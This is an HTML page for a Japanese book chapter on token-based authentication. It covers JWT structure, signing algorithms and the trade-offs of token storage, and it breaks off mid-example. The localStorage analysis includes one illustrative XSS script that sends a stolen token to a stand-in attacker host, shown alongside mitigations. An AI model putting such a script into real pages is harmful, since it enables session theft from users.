@@ -1,0 +1,2306 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>第5章 トークンベース認証 - 実践 認証認可システム設計</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+        }
+        .book-layout {
+            display: flex;
+            min-height: 100vh;
+        }
+        .book-sidebar {
+            width: 280px;
+            background-color: #fff;
+            border-right: 1px solid #e9ecef;
+            padding: 20px;
+            overflow-y: auto;
+            position: fixed;
+            height: 100vh;
+        }
+        .book-main {
+            margin-left: 280px;
+            flex: 1;
+            padding: 40px;
+            max-width: 900px;
+        }
+        .sidebar-title {
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        .nav-section {
+            margin-bottom: 30px;
+        }
+        .nav-section-title {
+            font-size: 0.9em;
+            font-weight: 600;
+            color: #6c757d;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 10px;
+        }
+        .nav-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .nav-link {
+            display: block;
+            padding: 8px 12px;
+            color: #495057;
+            text-decoration: none;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+        .nav-link:hover {
+            background-color: #e9ecef;
+            color: #007bff;
+        }
+        .nav-link.active {
+            background-color: #007bff;
+            color: white;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #34495e;
+            margin-top: 30px;
+        }
+        h3 {
+            color: #2c3e50;
+            margin-top: 25px;
+        }
+        pre {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+        }
+        code {
+            background-color: #f8f9fa;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+            color: #6c757d;
+            text-align: center;
+        }
+        @media (max-width: 768px) {
+            .book-sidebar {
+                display: none;
+            }
+            .book-main {
+                margin-left: 0;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="book-layout">
+        <!-- Sidebar Navigation -->
+        <aside class="book-sidebar">
+            <div class="sidebar-title">
+                <a href="/practical-auth-book/" style="color: inherit; text-decoration: none;">実践 認証認可システム設計</a>
+            </div>
+            
+            <nav class="sidebar-nav">
+                <div class="nav-section">
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/introduction" class="nav-link">はじめに</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">第I部: 基礎概念編</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/chapters/chapter-01-overview" class="nav-link">第1章: 認証認可の全体像</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-02-authentication" class="nav-link">第2章: 認証の基礎</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-03-authorization" class="nav-link">第3章: 認可の基礎</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">第II部: プロトコルと標準編</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/chapters/chapter-04-session" class="nav-link">第4章: セッション管理</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-05-token-auth" class="nav-link">第5章: トークンベース認証</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-06-oauth2" class="nav-link">第6章: OAuth 2.0</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-07-oidc-saml" class="nav-link">第7章: OpenID ConnectとSAML</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">第III部: 実装編</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/chapters/chapter-08-auth-system-design" class="nav-link">第8章: 認証システムの設計</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-09-microservices-auth" class="nav-link">第9章: マイクロサービスでの認証認可</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-10-implementation-patterns" class="nav-link">第10章: 実装パターンとベストプラクティス</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">第IV部: 応用編</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/chapters/chapter-11-security-threats" class="nav-link">第11章: セキュリティ脅威と対策</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-12-performance" class="nav-link">第12章: パフォーマンス最適化</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-13-future" class="nav-link">第13章: 認証技術の未来</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">付録</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/appendices/appendix-a-libraries" class="nav-link">付録A: 主要ライブラリ・ツール一覧</a></li>
+                        <li><a href="/practical-auth-book/appendices/appendix-b-troubleshooting" class="nav-link">付録B: トラブルシューティングガイド</a></li>
+                        <li><a href="/practical-auth-book/appendices/appendix-c-glossary" class="nav-link">付録C: 用語集</a></li>
+                        <li><a href="/practical-auth-book/appendices/appendix-d-references" class="nav-link">付録D: 参考文献・リソース</a></li>
+                    </ul>
+                </div>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="book-main">
+            <div class="container">
+                </p><h1>第5章 トークンベース認証</h1><h2>なぜこの章が重要か</h2><p>モダンなWebアプリケーション、特にSPA（Single Page Application）やモバイルアプリケーションの台頭により、従来のセッションベース認証では対応が困難な課題が生まれました。この章では、なぜJWT（JSON Web Token）が広く採用されているのか、その利点と課題、そして安全な実装方法を学びます。トークンベース認証の本質を理解することで、スケーラブルで柔軟な認証システムを構築できるようになります。</p><h2>5.1 JWTの構造と仕組み - なぜJWTが広く採用されているのか</h2><h3>5.1.1 トークンベース認証が生まれた背景</h3><p>#### 従来のセッション認証の限界</p><p><pre><code>python
+<p>class TraditionalSessionChallenges:</p>
+<p>    """従来のセッション認証が直面した課題"""</p>
+    
+<p>    def demonstrate_scalability_issue(self):</p>
+<p>        """スケーラビリティの問題を実証"""</p>
+        
+<p>        # 問題1: サーバー間でのセッション共有</p>
+<p>        traditional_architecture = {</p>
+<p>            'server_1': {</p>
+<p>                'sessions': {'user123': {'name': 'Alice', 'cart': ['item1']}}</p>
+<p>            },</p>
+<p>            'server_2': {</p>
+<p>                'sessions': {}  # Server2はuser123のセッションを知らない</p>
+<p>            },</p>
+<p>            'problem': 'ロードバランサーがServer2に振り分けるとセッション喪失'</p>
+<p>        }</p>
+        
+<p>        # 問題2: マイクロサービスでの認証状態共有</p>
+<p>        microservices_challenge = {</p>
+<p>            'api_gateway': 'セッション確認',</p>
+<p>            'user_service': 'セッション情報が必要',</p>
+<p>            'order_service': 'セッション情報が必要',</p>
+<p>            'payment_service': 'セッション情報が必要',</p>
+<p>            'problem': '各サービスがセッションストアにアクセス → ボトルネック'</p>
+<p>        }</p>
+        
+<p>        # 問題3: モバイルアプリでの課題</p>
+<p>        mobile_challenges = {</p>
+<p>            'cookie_support': '一貫性のないCookie実装',</p>
+<p>            'background_refresh': 'アプリ停止時のセッション維持',</p>
+<p>            'multiple_devices': '複数デバイスでの同時利用',</p>
+<p>            'api_first': 'RESTful APIとの相性の悪さ'</p>
+<p>        }</p>
+        
+<p>        return {</p>
+<p>            'issues': [</p>
+<p>                'ステートフルであることによるスケーラビリティの制約',</p>
+<p>                'サーバー側のメモリ/ストレージ要件',</p>
+<p>                'クロスドメインでの利用困難',</p>
+<p>                'モバイルアプリケーションとの相性の悪さ'</p>
+<p>            ]</p>
+<p>        }</p>
+<p></code></pre></p><p>#### トークンベース認証の登場</p><p><pre><code>python</p>
+<p>class TokenBasedAuthEvolution:</p>
+<p>    """トークンベース認証の進化"""</p>
+    
+<p>    def explain_token_advantages(self):</p>
+<p>        """トークンベース認証の利点"""</p>
+        
+<p>        return {</p>
+<p>            'stateless': {</p>
+<p>                'benefit': 'サーバーはセッション状態を保持しない',</p>
+<p>                'impact': 'どのサーバーでもリクエストを処理可能',</p>
+<p>                'example': '''</p>
+<p>                # セッション認証</p>
+<p>                Server1: sessions[sid] = user_data  # メモリ使用</p>
+<p>                Server2: sessions[sid] = ???         # 同期が必要</p>
+                
+<p>                # トークン認証</p>
+<p>                Server1: verify_token(token)  # ステートレス</p>
+<p>                Server2: verify_token(token)  # 同じロジックで検証</p>
+<p>                '''</p>
+<p>            },</p>
+            
+<p>            'self_contained': {</p>
+<p>                'benefit': '必要な情報をトークン自体に含む',</p>
+<p>                'impact': 'データベース参照不要で高速',</p>
+<p>                'example': '''</p>
+<p>                # トークンペイロード</p>
+<p>                {</p>
+<p>                    "user_id": "123",</p>
+<p>                    "email": "user@example.com",</p>
+<p>                    "roles": ["user", "admin"],</p>
+<p>                    "exp": 1634567890</p>
+<p>                }</p>
+<p>                '''</p>
+<p>            },</p>
+            
+<p>            'cross_domain': {</p>
+<p>                'benefit': 'CORS制約を受けない',</p>
+<p>                'impact': 'マイクロサービス、SPA、モバイルで使いやすい',</p>
+<p>                'usage': 'Authorization: Bearer <token>'</p>
+<p>            },</p>
+            
+<p>            'decentralized_verification': {</p>
+<p>                'benefit': '公開鍵があれば誰でも検証可能',</p>
+<p>                'impact': 'サービス間の密結合を避けられる',</p>
+<p>                'example': 'API Gateway で一度検証すれば、後続サービスは信頼'</p>
+<p>            }</p>
+<p>        }</p>
+<p></code></pre></p><h3>5.1.2 JWTの構造</h3><p>#### JWTの3つの部分</p><p><pre><code>python</p>
+<p>import base64</p>
+<p>import json</p>
+<p>import hmac</p>
+<p>import hashlib</p>
+<p>from typing import Dict, Any, Optional</p><p>class JWTStructure:</p>
+<p>    """JWTの構造を理解するためのクラス"""</p>
+    
+<p>    def explain_jwt_parts(self):</p>
+<p>        """JWT の3つの部分の説明"""</p>
+        
+<p>        jwt_example = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"</p>
+        
+<p>        parts = jwt_example.split('.')</p>
+        
+<p>        return {</p>
+<p>            'structure': 'header.payload.signature',</p>
+<p>            'parts': {</p>
+<p>                'header': {</p>
+<p>                    'encoded': parts[0],</p>
+<p>                    'decoded': self._decode_part(parts[0]),</p>
+<p>                    'purpose': 'トークンのタイプと署名アルゴリズムを指定',</p>
+<p>                    'typical_content': {</p>
+<p>                        'alg': 'HS256',  # 署名アルゴリズム</p>
+<p>                        'typ': 'JWT'     # トークンタイプ</p>
+<p>                    }</p>
+<p>                },</p>
+<p>                'payload': {</p>
+<p>                    'encoded': parts[1],</p>
+<p>                    'decoded': self._decode_part(parts[1]),</p>
+<p>                    'purpose': 'クレーム（主張）を含む',</p>
+<p>                    'standard_claims': {</p>
+<p>                        'iss': 'Issuer - 発行者',</p>
+<p>                        'sub': 'Subject - 主題（通常はユーザーID）',</p>
+<p>                        'aud': 'Audience - 受信者',</p>
+<p>                        'exp': 'Expiration Time - 有効期限',</p>
+<p>                        'nbf': 'Not Before - 有効開始時刻',</p>
+<p>                        'iat': 'Issued At - 発行時刻',</p>
+<p>                        'jti': 'JWT ID - トークンの一意識別子'</p>
+<p>                    }</p>
+<p>                },</p>
+<p>                'signature': {</p>
+<p>                    'encoded': parts[2],</p>
+<p>                    'purpose': '改ざん検出のための署名',</p>
+<p>                    'calculation': 'HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)'</p>
+<p>                }</p>
+<p>            }</p>
+<p>        }</p>
+    
+<p>    def _decode_part(self, encoded_part: str) -> Dict:</p>
+<p>        """Base64URLデコード"""</p>
+<p>        # パディング調整</p>
+<p>        padding = len(encoded_part) % 4</p>
+<p>        if padding:</p>
+<p>            encoded_part += '=' * (4 - padding)</p>
+        
+<p>        decoded_bytes = base64.urlsafe_b64decode(encoded_part)</p>
+<p>        return json.loads(decoded_bytes)</p>
+    
+<p>    def create_jwt_manually(self, payload: Dict[str, Any], secret: str) -> str:</p>
+<p>        """JWTを手動で作成して仕組みを理解"""</p>
+        
+<p>        # 1. ヘッダーの作成</p>
+<p>        header = {</p>
+<p>            'alg': 'HS256',</p>
+<p>            'typ': 'JWT'</p>
+<p>        }</p>
+        
+<p>        # 2. Base64URLエンコード</p>
+<p>        header_encoded = self._base64url_encode(json.dumps(header))</p>
+<p>        payload_encoded = self._base64url_encode(json.dumps(payload))</p>
+        
+<p>        # 3. 署名の作成</p>
+<p>        message = f"{header_encoded}.{payload_encoded}"</p>
+<p>        signature = hmac.new(</p>
+<p>            secret.encode(),</p>
+<p>            message.encode(),</p>
+<p>            hashlib.sha256</p>
+<p>        ).digest()</p>
+<p>        signature_encoded = self._base64url_encode(signature)</p>
+        
+<p>        # 4. JWT の組み立て</p>
+<p>        jwt = f"{header_encoded}.{payload_encoded}.{signature_encoded}"</p>
+        
+<p>        return jwt</p>
+    
+<p>    def _base64url_encode(self, data: Any) -> str:</p>
+<p>        """Base64URLエンコード"""</p>
+<p>        if isinstance(data, str):</p>
+<p>            data = data.encode()</p>
+        
+<p>        encoded = base64.urlsafe_b64encode(data).decode()</p>
+<p>        # パディングを削除</p>
+<p>        return encoded.rstrip('=')</p>
+    
+<p>    def verify_jwt_manually(self, jwt: str, secret: str) -> tuple[bool, Optional[Dict]]:</p>
+<p>        """JWTを手動で検証して仕組みを理解"""</p>
+        
+<p>        try:</p>
+<p>            # 1. JWTを分割</p>
+<p>            parts = jwt.split('.')</p>
+<p>            if len(parts) != 3:</p>
+<p>                return False, None</p>
+            
+<p>            header_encoded, payload_encoded, signature_encoded = parts</p>
+            
+<p>            # 2. 署名を再計算</p>
+<p>            message = f"{header_encoded}.{payload_encoded}"</p>
+<p>            expected_signature = hmac.new(</p>
+<p>                secret.encode(),</p>
+<p>                message.encode(),</p>
+<p>                hashlib.sha256</p>
+<p>            ).digest()</p>
+<p>            expected_signature_encoded = self._base64url_encode(expected_signature)</p>
+            
+<p>            # 3. 署名を比較（タイミング攻撃対策）</p>
+<p>            if not hmac.compare_digest(signature_encoded, expected_signature_encoded):</p>
+<p>                return False, None</p>
+            
+<p>            # 4. ペイロードをデコード</p>
+<p>            payload = self._decode_part(payload_encoded)</p>
+            
+<p>            # 5. 有効期限チェック</p>
+<p>            import time</p>
+<p>            if 'exp' in payload and payload['exp'] < time.time():</p>
+<p>                return False, None</p>
+            
+<p>            return True, payload</p>
+            
+<p>        except Exception as e:</p>
+<p>            print(f"JWT verification error: {e}")</p>
+<p>            return False, None</p>
+<p></code></pre></p><p>#### JWTが選ばれる理由</p><p><pre><code>python</p>
+<p>class WhyJWT:</p>
+<p>    """なぜJWTが広く採用されているのか"""</p>
+    
+<p>    def explain_jwt_benefits(self):</p>
+<p>        """JWTの利点を実例で説明"""</p>
+        
+<p>        return {</p>
+<p>            'portability': {</p>
+<p>                'description': '異なるプログラミング言語間での互換性',</p>
+<p>                'example': '''</p>
+<p>                # Python でトークン生成</p>
+<p>                token = jwt.encode(payload, secret, algorithm='HS256')</p>
+                
+<p>                // JavaScript で検証</p>
+<p>                const decoded = jwt.verify(token, secret);</p>
+                
+<p>                // Go で検証</p>
+<p>                claims, err := jwt.Parse(token, secret)</p>
+<p>                ''',</p>
+<p>                'benefit': '言語やプラットフォームに依存しない'</p>
+<p>            },</p>
+            
+<p>            'url_safe': {</p>
+<p>                'description': 'URL セーフな文字のみ使用',</p>
+<p>                'format': 'Base64URL エンコーディング',</p>
+<p>                'usage': [</p>
+<p>                    'URL パラメータ: ?token=eyJhbG...',</p>
+<p>                    'HTTP ヘッダー: Authorization: Bearer eyJhbG...',</p>
+<p>                    'Cookie: token=eyJhbG...'</p>
+<p>                ],</p>
+<p>                'benefit': '様々な転送方法で使用可能'</p>
+<p>            },</p>
+            
+<p>            'standardized': {</p>
+<p>                'description': 'RFC 7519 として標準化',</p>
+<p>                'ecosystem': [</p>
+<p>                    '豊富なライブラリ',</p>
+<p>                    'デバッグツール（jwt.io）',</p>
+<p>                    'ベストプラクティスの確立'</p>
+<p>                ],</p>
+<p>                'benefit': '実装の品質と相互運用性の保証'</p>
+<p>            },</p>
+            
+<p>            'compact': {</p>
+<p>                'description': 'コンパクトな表現',</p>
+<p>                'comparison': '''</p>
+<p>                # SAML assertion (XML): ~2KB</p>
+<p>                <saml:Assertion></p>
+<p>                    <saml:Subject>...</saml:Subject></p>
+<p>                    <saml:Conditions>...</saml:Conditions></p>
+<p>                    ...</p>
+<p>                </saml:Assertion></p>
+                
+<p>                # JWT: ~200 bytes</p>
+<p>                eyJhbGciOiJIUzI1NiIs...</p>
+<p>                ''',</p>
+<p>                'benefit': 'ネットワーク帯域の節約'</p>
+<p>            },</p>
+            
+<p>            'flexible_verification': {</p>
+<p>                'description': '様々な検証方式をサポート',</p>
+<p>                'algorithms': {</p>
+<p>                    'HMAC': '共有秘密鍵（HS256, HS384, HS512）',</p>
+<p>                    'RSA': '公開鍵暗号（RS256, RS384, RS512）',</p>
+<p>                    'ECDSA': '楕円曲線暗号（ES256, ES384, ES512）'</p>
+<p>                },</p>
+<p>                'benefit': 'セキュリティ要件に応じて選択可能'</p>
+<p>            }</p>
+<p>        }</p>
+<p></code></pre></p><h3>5.1.3 JWTの署名アルゴリズム</h3><p><pre><code>python</p>
+<p>import jwt</p>
+<p>from cryptography.hazmat.primitives import hashes</p>
+<p>from cryptography.hazmat.primitives.asymmetric import rsa, padding</p>
+<p>from cryptography.hazmat.primitives import serialization</p><p>class JWTAlgorithms:</p>
+<p>    """JWT署名アルゴリズムの詳細"""</p>
+    
+<p>    def __init__(self):</p>
+<p>        self.algorithms = self._setup_algorithms()</p>
+    
+<p>    def _setup_algorithms(self):</p>
+<p>        """各アルゴリズムの特性"""</p>
+        
+<p>        return {</p>
+<p>            'HS256': {</p>
+<p>                'name': 'HMAC with SHA-256',</p>
+<p>                'type': 'Symmetric',</p>
+<p>                'key_type': '共有秘密鍵',</p>
+<p>                'key_size': '256 bits minimum',</p>
+<p>                'use_case': '内部システム、単一組織',</p>
+<p>                'pros': ['高速', 'シンプル'],</p>
+<p>                'cons': ['鍵配布の問題', 'すべての検証者が署名も可能'],</p>
+<p>                'implementation': self._implement_hs256</p>
+<p>            },</p>
+            
+<p>            'RS256': {</p>
+<p>                'name': 'RSA Signature with SHA-256',</p>
+<p>                'type': 'Asymmetric',</p>
+<p>                'key_type': '公開鍵/秘密鍵ペア',</p>
+<p>                'key_size': '2048 bits minimum',</p>
+<p>                'use_case': '外部API、マイクロサービス',</p>
+<p>                'pros': ['公開鍵で検証可能', '署名者を限定'],</p>
+<p>                'cons': ['処理が遅い', '鍵管理が複雑'],</p>
+<p>                'implementation': self._implement_rs256</p>
+<p>            },</p>
+            
+<p>            'ES256': {</p>
+<p>                'name': 'ECDSA with P-256 and SHA-256',</p>
+<p>                'type': 'Asymmetric',</p>
+<p>                'key_type': '楕円曲線鍵ペア',</p>
+<p>                'key_size': '256 bits (P-256 curve)',</p>
+<p>                'use_case': 'モバイル、IoT',</p>
+<p>                'pros': ['短い鍵で高セキュリティ', '高速な検証'],</p>
+<p>                'cons': ['実装が複雑', 'ライブラリ依存'],</p>
+<p>                'implementation': self._implement_es256</p>
+<p>            },</p>
+            
+<p>            'none': {</p>
+<p>                'name': 'No digital signature',</p>
+<p>                'type': 'None',</p>
+<p>                'security': 'INSECURE - NEVER USE IN PRODUCTION',</p>
+<p>                'warning': '署名なしトークンは改ざん可能'</p>
+<p>            }</p>
+<p>        }</p>
+    
+<p>    def _implement_hs256(self):</p>
+<p>        """HMAC-SHA256 の実装例"""</p>
+        
+<p>        class HS256Implementation:</p>
+<p>            def __init__(self, secret: str):</p>
+<p>                self.secret = secret.encode() if isinstance(secret, str) else secret</p>
+                
+<p>                # 秘密鍵の強度チェック</p>
+<p>                if len(self.secret) < 32:  # 256 bits</p>
+<p>                    raise ValueError("Secret key must be at least 256 bits")</p>
+            
+<p>            def sign(self, payload: dict) -> str:</p>
+<p>                """トークンの署名"""</p>
+<p>                return jwt.encode(payload, self.secret, algorithm='HS256')</p>
+            
+<p>            def verify(self, token: str) -> dict:</p>
+<p>                """トークンの検証"""</p>
+<p>                return jwt.decode(token, self.secret, algorithms=['HS256'])</p>
+            
+<p>            def rotate_key(self, new_secret: str, grace_period: int = 3600):</p>
+<p>                """鍵のローテーション"""</p>
+<p>                # 実装例：一定期間は両方の鍵を受け入れる</p>
+<p>                old_secret = self.secret</p>
+<p>                self.secret = new_secret.encode()</p>
+                
+<p>                def verify_with_rotation(token: str) -> dict:</p>
+<p>                    try:</p>
+<p>                        # 新しい鍵で検証</p>
+<p>                        return jwt.decode(token, self.secret, algorithms=['HS256'])</p>
+<p>                    except jwt.InvalidSignatureError:</p>
+<p>                        # 古い鍵で検証（猶予期間中）</p>
+<p>                        return jwt.decode(token, old_secret, algorithms=['HS256'])</p>
+                
+<p>                return verify_with_rotation</p>
+        
+<p>        return HS256Implementation</p>
+    
+<p>    def _implement_rs256(self):</p>
+<p>        """RSA-SHA256 の実装例"""</p>
+        
+<p>        class RS256Implementation:</p>
+<p>            def __init__(self):</p>
+<p>                # 鍵ペアの生成</p>
+<p>                self.private_key = rsa.generate_private_key(</p>
+<p>                    public_exponent=65537,</p>
+<p>                    key_size=2048</p>
+<p>                )</p>
+<p>                self.public_key = self.private_key.public_key()</p>
+            
+<p>            def sign(self, payload: dict) -> str:</p>
+<p>                """秘密鍵で署名"""</p>
+<p>                private_pem = self.private_key.private_bytes(</p>
+<p>                    encoding=serialization.Encoding.PEM,</p>
+<p>                    format=serialization.PrivateFormat.PKCS8,</p>
+<p>                    encryption_algorithm=serialization.NoEncryption()</p>
+<p>                )</p>
+                
+<p>                return jwt.encode(payload, private_pem, algorithm='RS256')</p>
+            
+<p>            def verify(self, token: str) -> dict:</p>
+<p>                """公開鍵で検証"""</p>
+<p>                public_pem = self.public_key.public_bytes(</p>
+<p>                    encoding=serialization.Encoding.PEM,</p>
+<p>                    format=serialization.PublicFormat.SubjectPublicKeyInfo</p>
+<p>                )</p>
+                
+<p>                return jwt.decode(token, public_pem, algorithms=['RS256'])</p>
+            
+<p>            def get_jwks(self):</p>
+<p>                """JWKSエンドポイント用の公開鍵情報"""</p>
+<p>                from cryptography.hazmat.primitives.asymmetric import rsa</p>
+                
+<p>                numbers = self.public_key.public_numbers()</p>
+                
+<p>                # JWK形式</p>
+<p>                return {</p>
+<p>                    'keys': [{</p>
+<p>                        'kty': 'RSA',</p>
+<p>                        'use': 'sig',</p>
+<p>                        'kid': 'rsa-key-1',</p>
+<p>                        'n': self._int_to_base64url(numbers.n),</p>
+<p>                        'e': self._int_to_base64url(numbers.e)</p>
+<p>                    }]</p>
+<p>                }</p>
+            
+<p>            def _int_to_base64url(self, num: int) -> str:</p>
+<p>                """整数をBase64URLエンコード"""</p>
+<p>                hex_str = format(num, 'x')</p>
+<p>                if len(hex_str) % 2:</p>
+<p>                    hex_str = '0' + hex_str</p>
+                
+<p>                return base64.urlsafe_b64encode(</p>
+<p>                    bytes.fromhex(hex_str)</p>
+<p>                ).decode().rstrip('=')</p>
+        
+<p>        return RS256Implementation</p>
+<p></code></pre></p><h2>5.2 トークンの保存と管理 - XSSとCSRFのリスク評価</h2><h3>5.2.1 トークン保存場所の選択</h3><p>#### なぜ保存場所が重要なのか</p><p><pre><code>python</p>
+<p>class TokenStorageAnalysis:</p>
+<p>    """トークン保存場所の分析"""</p>
+    
+<p>    def analyze_storage_options(self):</p>
+<p>        """各保存場所の詳細な分析"""</p>
+        
+<p>        return {</p>
+<p>            'local_storage': {</p>
+<p>                'description': 'ブラウザのLocalStorage API',</p>
+<p>                'example': 'localStorage.setItem("token", "eyJhbG...")',</p>
+                
+<p>                'pros': [</p>
+<p>                    '実装が簡単',</p>
+<p>                    '5MB程度の容量',</p>
+<p>                    'JavaScript から簡単にアクセス可能',</p>
+<p>                    'タブ間で共有される'</p>
+<p>                ],</p>
+                
+<p>                'cons': [</p>
+<p>                    'XSS攻撃に対して脆弱',</p>
+<p>                    'JavaScript から読み取り可能',</p>
+<p>                    'ブラウザ拡張からもアクセス可能'</p>
+<p>                ],</p>
+                
+<p>                'security_risk': {</p>
+<p>                    'XSS': 'HIGH - すべてのJavaScriptコードがアクセス可能',</p>
+<p>                    'CSRF': 'LOW - 自動的に送信されない',</p>
+<p>                    'example_attack': '''</p>
+<p>                    // XSS攻撃例</p>
+<p>                    <script></p>
+<p>                    // 攻撃者のスクリプト</p>
+<p>                    const token = localStorage.getItem('token');</p>
+<p>                    fetch('https://attacker.com/steal', {</p>
+<p>                        method: 'POST',</p>
+<p>                        body: JSON.stringify({ token })</p>
+<p>                    });</p>
+<p>                    </script></p>
+<p>                    '''</p>
+<p>                },</p>
+                
+<p>                'mitigation': [</p>
+<p>                    'Content Security Policy (CSP) の実装',</p>
+<p>                    '入力値の厳格なサニタイゼーション',</p>
+<p>                    'トークンの有効期限を短く設定'</p>
+<p>                ]</p>
+<p>            },</p>
+            
+<p>            'session_storage': {</p>
+<p>                'description': 'ブラウザのSessionStorage API',</p>
+<p>                'example': 'sessionStorage.setItem("token", "eyJhbG...")',</p>
+                
+<p>                'pros': [</p>
+<p>                    'タブが閉じられると自動削除',</p>
+<p>                    'タブ間で共有されない',</p>
+<p>                    'LocalStorageより若干安全'</p>
+<p>                ],</p>
+                
+<p>                'cons': [</p>
+<p>                    'XSS攻撃には依然として脆弱',</p>
+<p>                    'ページリロードで保持される',</p>
+<p>                    'ユーザビリティの課題'</p>
+<p>                ],</p>
+                
+<p>                'security_risk': {</p>
+<p>                    'XSS': 'HIGH - LocalStorageと同様',</p>
+<p>                    'CSRF': 'LOW - 自動送信されない'</p>
+<p>                },</p>
+                
+<p>                'use_case': 'セキュリティを重視する一時的なセッション'</p>
+<p>            },</p>
+            
+<p>            'http_only_cookie': {</p>
+<p>                'description': 'HttpOnly属性付きCookie',</p>
+<p>                'example': 'Set-Cookie: token=eyJhbG...; HttpOnly; Secure; SameSite=Lax',</p>
+                
+<p>                'pros': [</p>
+<p>                    'JavaScriptからアクセス不可（XSS対策）',</p>
+<p>                    '自動的にリクエストに含まれる',</p>
+<p>                    'ブラウザが管理'</p>
+<p>                ],</p>
+                
+<p>                'cons': [</p>
+<p>                    'CSRF攻撃の可能性',</p>
+<p>                    'Cookie サイズ制限（4KB）',</p>
+<p>                    'CORS での扱いが複雑'</p>
+<p>                ],</p>
+                
+<p>                'security_risk': {</p>
+<p>                    'XSS': 'LOW - JavaScriptからアクセス不可',</p>
+<p>                    'CSRF': 'MEDIUM - 適切な対策が必要',</p>
+<p>                    'mitigation': 'SameSite属性とCSRFトークンの併用'</p>
+<p>                },</p>
+                
+<p>                'implementation': self._implement_secure_cookie</p>
+<p>            },</p>
+            
+<p>            'memory': {</p>
+<p>                'description': 'JavaScriptメモリ内（変数）',</p>
+<p>                'example': 'let authToken = "eyJhbG...";',</p>
+                
+<p>                'pros': [</p>
+<p>                    '最も安全（永続化されない）',</p>
+<p>                    'XSS攻撃でも簡単には取得できない',</p>
+<p>                    'デバッグツールでも見えにくい'</p>
+<p>                ],</p>
+                
+<p>                'cons': [</p>
+<p>                    'ページリロードで失われる',</p>
+<p>                    'タブ間で共有できない',</p>
+<p>                    'ユーザビリティが低い'</p>
+<p>                ],</p>
+                
+<p>                'security_risk': {</p>
+<p>                    'XSS': 'LOW - グローバルスコープを避ければ安全',</p>
+<p>                    'CSRF': 'NONE - 自動送信されない'</p>
+<p>                },</p>
+                
+<p>                'pattern': 'リフレッシュトークンはCookie、アクセストークンはメモリ'</p>
+<p>            }</p>
+<p>        }</p>
+    
+<p>    def _implement_secure_cookie(self):</p>
+<p>        """セキュアなCookie実装"""</p>
+        
+<p>        class SecureCookieImplementation:</p>
+<p>            def set_token_cookie(self, response, token: str, token_type: str = 'access'):</p>
+<p>                """セキュアなCookieの設定"""</p>
+                
+<p>                if token_type == 'access':</p>
+<p>                    # アクセストークン用の設定</p>
+<p>                    response.set_cookie(</p>
+<p>                        'access_token',</p>
+<p>                        value=token,</p>
+<p>                        max_age=900,  # 15分</p>
+<p>                        httponly=True,  # XSS対策</p>
+<p>                        secure=True,    # HTTPS必須</p>
+<p>                        samesite='Lax', # CSRF対策（基本）</p>
+<p>                        path='/'</p>
+<p>                    )</p>
+                
+<p>                elif token_type == 'refresh':</p>
+<p>                    # リフレッシュトークン用の設定（より厳格）</p>
+<p>                    response.set_cookie(</p>
+<p>                        'refresh_token',</p>
+<p>                        value=token,</p>
+<p>                        max_age=604800,  # 7日間</p>
+<p>                        httponly=True,</p>
+<p>                        secure=True,</p>
+<p>                        samesite='Strict',  # CSRF対策（厳格）</p>
+<p>                        path='/api/auth/refresh'  # パスを限定</p>
+<p>                    )</p>
+                
+<p>                return response</p>
+            
+<p>            def split_token_storage(self):</p>
+<p>                """トークン分割保存パターン"""</p>
+                
+<p>                # セキュリティを最大化するパターン</p>
+<p>                return {</p>
+<p>                    'pattern': 'Split Token',</p>
+<p>                    'implementation': '''</p>
+<p>                    // 1. トークンを分割</p>
+<p>                    const token = "eyJhbGciOiJIUzI1NiIs...";</p>
